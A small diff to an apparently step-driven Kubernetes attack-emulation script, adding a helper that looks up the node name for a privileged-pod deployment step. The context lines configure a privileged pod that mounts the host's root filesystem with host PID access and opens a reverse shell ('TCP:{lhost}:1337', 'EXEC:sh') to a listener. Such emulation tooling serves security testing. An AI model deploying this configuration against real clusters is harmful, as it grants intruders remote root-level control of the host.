@@ -44,6 +44,11 @@ def node_ip():
     return out.strip()
 
 
+def node_name():
+    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].metadata.name}'")
+    return out.strip()
+
+
 def graph():
     _, g = api("/api/graph")
     return g.get("nodes", [])
@@ -384,7 +389,7 @@ def step_19_deploy_privileged(ctx):
                    {"LISTENER_REF": "listener/tcp/1337",
                     "LISTENER": lhost, "LISTENER_PORT": "1337",
                     "PodName": "ran-privileged", "Namespace": "agent-system",
-                    "ServiceAccount": "default", "NodeName": "tanzee",
+                    "ServiceAccount": "default", "NodeName": node_name(),
                     "HostPID": "true", "HostIPC": "false", "HostNetwork": "false",
                     "Arguments": f'["TCP:{lhost}:1337", "EXEC:sh"]',
                     "HostPath": "/", "Mount": "/host", "Privileged": "true",
